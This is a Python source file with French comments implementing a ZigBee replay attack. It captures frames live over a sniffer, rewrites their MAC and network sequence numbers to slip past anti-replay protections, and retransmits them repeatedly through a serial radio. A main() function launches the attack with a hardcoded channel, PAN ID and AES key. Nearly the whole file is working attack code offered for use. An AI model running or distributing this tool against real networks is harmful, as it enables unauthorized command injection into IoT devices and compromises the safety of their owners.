"""
Ce Module implémente une attaque de replay sur le réseau ZigBee. Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee. Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l' attaque.
"""
import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
from typing import Dict, Optional, List

from CodeurTrame import CodeurTrameZigbee
from DecodeurTrame import DecodeurTrameZigbee
from sniff import SniffeurZigbee

# Configuration du logger
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

class ZigbeeReplayAttack:
    """
    @class ZigbeeReplayAttack
    @brief Classe pour effectuer une attaque de replay sur le réseau ZigBee.
    @details Cette classe permet de capturer des trames ZigBee, de les analyser, de les modifier (par exemple, en modifiant
             les numéros de séquence) et de les rejouer sur le réseau ZigBee. Elle gère également les mécanismes de 
             protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.
    """

    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        """
        @brief Constructeur de la classe ZigbeeReplayAttack.
        
        @param capture_file: Nom du fichier de capture pour stocker les trames ZigBee capturées.
        @param channel: Canal ZigBee sur lequel l'attaque de replay sera effectuée.
        @param pan_id: PAN ID du réseau ZigBee.
        @param serial_port: Port série utilisé pour envoyer les trames de replay.
        @param aes_key: Clé AES pour la sécurité des trames, si applicable.
        """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        # Initialisation des classes auxiliaires
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200
        )
        
        # Gestion des séquences et anti-replay
        self.sequence_base = None
        self.sequence_offset = 0
        self.captures = []
        self.replay_queue = queue.Queue()
        self.sequence_variations = []

    def capturer_trames_live(self, duree_capture: int = 10):
        """
        @brief Capture live des trames ZigBee pendant une durée spécifiée.
        
        @param duree_capture: Durée de la capture en secondes.
        """
        logger.info(f"Démarrage de la capture live pour {duree_capture} secondes")
        self.sniffer.demarrer_sniffer()
        time.sleep(duree_capture)
        self.sniffer.arreter_sniffer()
        self.sniffer.sauvegarder_captures()
        self.captures = self.sniffer.captures
        logger.info(f"Capture terminée : {len(self.captures)} trames capturées")

    def charger_captures(self):
        """
        @brief Charger et analyser les captures ZigBee à partir d'un fichier JSON.
        """
        try:
            with open(self.capture_file, 'r', encoding='utf-8') as f:
                raw_captures = json.load(f)
                
            # Décoder chaque trame capturée
            self.captures = []
            for capture in raw_captures:
                if isinstance(capture, str):  # Si c'est une chaîne hex
                    trame_bytes = bytes.fromhex(capture)
                    trame_decodee = self.decodeur.decoder_trame_zigbee(trame_bytes)
                    if trame_decodee:
                        self.captures.append(trame_decodee)
                else:  # Si c'est déjà un dictionnaire décodé
                    self.captures.append(capture)
            
            # Extraire les séquences
            self._extraire_sequences()
            logger.info(f"Chargement réussi : {len(self.captures)} trames")
            
        except Exception as e:
            logger.error(f"Erreur lors du chargement des captures : {e}")
            self.captures = []

    def _extraire_sequences(self):
        """
        @brief Extraire les numéros de séquence des trames capturées.
        """
        sequences = []
        for capture in self.captures:
            if capture['type_trame'] == 'Data':
                seq = capture['couche_mac'].get('numero_sequence')
                if seq is not None:
                    sequences.append(seq)
            elif 'sequence_number' in capture:
                sequences.append(capture['sequence_number'])
                
        if sequences:
            self.sequence_base = min(sequences)
            self._generer_variations_sequence()

    def _generer_variations_sequence(self):
        """
        @brief Générer des variations de numéro de séquence basées sur la séquence de base.
        """
        if not self.sequence_base:
            return
        
        variations = [
            self.sequence_base,
            (self.sequence_base + 1) % 256,
            (self.sequence_base + random.randint(2, 10)) % 256,
            self._generer_sequence_cryptographique()
        ]
        
        self.sequence_variations = variations
        logger.debug(f"Variations de séquence générées : {self.sequence_variations}")

    def _generer_sequence_cryptographique(self) -> int:
        """
        @brief Générer un numéro de séquence cryptographiquement sûr.
        
        @return: Numéro de séquence généré de manière cryptographique.
        """
        seed = hashlib.sha256(
            str(self.sequence_base).encode() + 
            str(time.time()).encode()
        ).digest()
        return int.from_bytes(seed[:1], byteorder='big')

    def preparer_trame_replay(self, trame_originale: dict) -> bytes:
        """
        @brief Préparer une trame pour le replay en modifiant le numéro de séquence.
        
        @param trame_originale: Trame ZigBee originale à modifier.
        
        @return: Trame prête à être envoyée en replay sous forme de bytes.
        """
        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
        
        # Modifier la séquence dans la trame
        if trame_originale['type_trame'] == 'Data':
            trame_originale['couche_mac']['numero_sequence'] = sequence
            trame_originale['couche_reseau']['sequence_number'] = sequence
        else:
            trame_originale['sequence_number'] = sequence
            
        # Encoder la trame modifiée
        return self.codeur.encoder_trame_zigbee(trame_originale)

    def preparer_trames_replay(self, nombre_trames: int = 20):
        """
        @brief Préparer plusieurs trames pour le replay.
        
        @param nombre_trames: Nombre de trames à préparer pour le replay.
        """
        self.replay_queue = queue.Queue()
        
        for _ in range(nombre_trames):
            if not self.captures:
                continue

            trame_originale = random.choice(self.captures)
            trame_modifiee = self.preparer_trame_replay(trame_originale)
            self.replay_queue.put(trame_modifiee)

    def envoyer_trames_replay(self, nombre_replays: int = 5):
        """
        @brief Envoyer les trames de replay via le port série.
        
        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
        """
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début du replay via {self.serial_port}")
                
                while not self.replay_queue.empty():
                    trame = self.replay_queue.get()
                    
                    for _ in range(nombre_replays):
                        # Construction de la trame complète avec en-tête
                        trame_complete = bytearray([
                            len(trame) + 3,  # Longueur
                            self.channel,    # Canal
                            self.pan_id >> 8,  # PAN ID (octet haut)
                            self.pan_id & 0xFF  # PAN ID (octet bas)
                        ])
                        trame_complete.extend(trame)
                        
                        # Envoi avec délai aléatoire
                        ser.write(trame_complete)
                        time.sleep(random.uniform(0.1, 0.5))
                        
                        logger.debug(f"Trame replay envoyée - Longueur: {len(trame_complete)}")
                        
        except Exception as e:
            logger.error(f"Erreur durant le replay : {e}")

    def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
        """
        @brief Lancer l'attaque de replay complète avec capture et envoi des trames.
        
        @param nombre_replays: Nombre de fois que chaque trame sera envoyée.
        @param capture_live: Si True, effectuer une capture live des trames ZigBee.
        """
        try:
            if capture_live:
                self.capturer_trames_live()
            else:
                self.charger_captures()
                
            if not self.captures:
                logger.error("Aucune trame à rejouer")
                return
                
            self.preparer_trames_replay()
            
            # Lancement du replay dans un thread séparé
            thread_replay = threading.Thread(
                target=self.envoyer_trames_replay, 
                kwargs={'nombre_replays': nombre_replays}
            )
            thread_replay.start()
            thread_replay.join()
            
        except Exception as e:
            logger.error(f"Échec de l'attaque de replay : {e}")

def main():
    """
    @brief Fonction principale pour configurer et lancer l'attaque de replay ZigBee.
    """
    # Configuration de l'attaque
    attaque = ZigbeeReplayAttack(
        capture_file='captures_zigbee.json',
        channel=13,
        pan_id=0x1900,
        serial_port='/dev/ttyACM0',
        aes_key="9b9494920170aeed67e90ce7d672face"
    )
    
    # Lancer l'attaque avec capture live
    attaque.lancer_attaque_replay(
        nombre_replays=3,
        capture_live=True
    )

if __name__ == "__main__":
    main()
